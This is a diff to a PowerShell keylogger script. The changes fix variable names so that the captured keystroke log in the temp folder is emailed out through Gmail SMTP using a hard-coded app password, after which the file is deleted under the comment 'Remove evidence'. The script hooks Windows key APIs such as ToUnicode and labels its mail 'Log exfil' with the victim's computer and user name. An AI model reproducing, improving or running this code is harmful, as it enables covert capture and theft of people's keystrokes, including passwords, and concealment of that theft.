@@ -5,20 +5,20 @@ $Subject = "Log exfil from $($env:computername) User:$($env:UserName)"
 $Password = "wxmukckmhuetdmvt" | ConvertTo-SecureString -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
 
-function Logger($logFile="$env:temp/$env:UserName.log") {
+function Logger($logFile="$env:temp/a.log") {
 
   #check if logger needs to create file
   if (Test-Path $logFile) {
     # Dateiinhalt auslesen
-    $content = Get-Content -Path $pathtofile
+    $content = Get-Content -Path $logFile
     # Send mail
     Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
     # Remove evidence
-    Remove-Item $pathtofile -Force
+    Remove-Item $logFile -Force
   }
 
   # generate log file
-  $generateLog = New-Item -Path $logFile -ItemType File -Force
+  New-Item -ItemType File -Path $logFile  -Force
 
   # API signatures
   $APIsignatures = @'
@@ -65,13 +65,13 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   # send logs if code fails
   finally {
-    notepad $logPath
+    notepad $logFile
     # Dateiinhalt auslesen
-    $content = Get-Content -Path $pathtofile
+    $content = Get-Content -Path $logFile
     # Send mail
     Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
     # Remove evidence
-    Remove-Item $pathtofile -Force
+    Remove-Item $logFile -Force
   }
 }
 
